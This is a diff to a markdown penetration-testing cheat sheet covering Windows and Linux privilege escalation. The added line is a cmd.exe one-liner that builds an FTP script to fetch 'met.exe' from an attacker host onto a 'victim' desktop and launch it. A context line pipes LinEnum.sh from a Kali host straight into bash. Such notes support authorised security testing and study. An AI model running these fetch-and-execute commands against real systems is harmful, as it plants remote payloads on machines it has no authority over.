@@ -13,6 +13,7 @@
 * `systeminfo >systeminfo.txt` _Export sysinfo from windows
 * `python windows-exploit-suggester.py --database 2018-09-06-mssb.xls --systeminfo sysinfo.txt` _Use exported sysinfo file to check for possible exploits using this tool https://github.com/GDSSecurity/Windows-Exploit-Suggester.git_
 * `python windows-exploit-suggester.py --update` _Get new database file for exploit suggester_
+* `cmd.exe /c @echo open x.x.x.x 21>c:\users\victim\desktop\ftp.txt&@echo USER anonymous>>c:\users\victim\desktop\ftp.txt&@echo anonymous>> c:\users\victim\desktop\ftp.txt&@echo binary>>c:\users\victim\desktop\ftp.txt&@echo get met.exe>>c:\users\victim\desktop\ftp.txt&@echo quit>>c:\users\victim\desktop\ftp.txt&@ftp -v -n -s:c:\users\victim\desktop\ftp.txt&@start met.exe` _Create a scirpt to download a file via ftp, then run the script, then run the downloaded file_
 
 ## Pric Esc Linux
 * `curl {kali_ip}:{port}/LinEnum.sh | /bin/bash` _Run linux enum script without dropping it on disk_
